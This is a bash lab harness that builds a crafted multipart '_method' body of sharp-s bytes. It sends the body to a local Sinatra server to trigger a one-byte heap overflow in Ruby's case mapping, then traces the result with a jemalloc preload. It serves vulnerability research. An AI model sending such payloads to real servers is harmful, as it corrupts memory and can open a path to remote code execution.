#!/bin/bash
# Stock classic Sinatra, wire-only exact-size-class _method under jemalloc.
# Analysis-only: jemtrace observes the case buffer at free via its capa
# first qword. No marker, ObjectSpace, maps read or debugger in request path.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-jemwire-$MODE-1}"
PORT="${JEM_WIRE_PORT:-4570}"
CLASS="${JEM_CLASS:-80}"
CAPA=$((CLASS - 24))                 # capa = N + 20 = (CLASS - 44) + 20
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
export RACK_ENV="${JEM_RACK_ENV:-development}"
export RUBY2SHELL_STOCK_PORT="$PORT"
EV=lab/build/evidence
mkdir -p "$EV"
BODY="$EV/$TAG.body"
LOG="$EV/$TAG.server.log"
OUT="$EV/$TAG.out"
TRACE="$EV/$TAG.trace"
python3 - "$MODE" "$CLASS" > "$BODY" <<'PY'
import sys
mode, klass = sys.argv[1], int(sys.argv[2])
m = klass - 65                      # request R = N + 44 = m + 65 = klass
if mode in ('attack', 'fixed'):
    # 20 expansion bytes consume the +20 slack; m invariant bytes; the final
    # sharp-s writes exactly one byte past the request-klass mapping buffer.
    data = b'\xdf' * 20 + b'a' * m + b'\xdf'
else:
    # Same length and encoding, no expansion: no OOB byte.
    data = b'a' * (m + 21)
sys.stdout.buffer.write(
    b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
    b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data +
    b'\r\n--XB--\r\n')
PY
ROOT="$PWD"
JEM_WIRE_RUBY="${JEM_WIRE_RUBY:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
BTRANGE=()
if [ -n "${JEM_BT_MIN:-}" ] && [ -n "${JEM_BT_MAX:-}" ]; then
  BTRANGE=("JEMTRACE_BT_MIN=$JEM_BT_MIN" "JEMTRACE_BT_MAX=$JEM_BT_MAX")
fi
env "${BTRANGE[@]}" \
LD_PRELOAD="$ROOT/lab/preload/jemtrace.so:libjemalloc.so.2" \
JEMTRACE_FD=9 \
JEMTRACE_WATCH_SIZE="$CLASS" \
JEMTRACE_FREE_Q0="$CAPA" \
JEMTRACE_BT_SIZE="${JEM_BT_SIZE:-}" \
JEMTRACE_BT_DEPTH="${JEM_BT_DEPTH:-10}" \
  "$JEM_WIRE_RUBY" \
  lab/repro/ruby2shell-stock-baseline.ru > "$LOG" 2>&1 9>"$TRACE" &
PID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then READY=YES; break; fi
  sleep 0.1
done
{
  echo "== $TAG mode=$MODE class=$CLASS capa=$CAPA ready=$READY"
  curl -s -m 20 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w '\nTRIGGER_HTTP=%{http_code}\n'
  curl -s -m 5 "http://127.0.0.1:$PORT/" -w '\nALIVE_HTTP=%{http_code}\n'
} > "$OUT" 2>&1
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
cp "/proc/$PID/maps" "$EV/$TAG.maps" 2>/dev/null || true
kill "$PID" 2>/dev/null
wait "$PID" 2>/dev/null
RC=$?
cat "$OUT"
echo "process-alive=$ALIVE server-rc=$RC"
CAPADUMP=$(grep -c "^W .* b=$(printf '%016x' "$CAPA")$" "$TRACE" 2>/dev/null || true)
HITS=$(grep '^W .* a=' "$TRACE" 2>/dev/null | grep -c '53$' || true)
echo "capa-dumps=$CAPADUMP adjacent-first-qword-53-hits=$HITS"
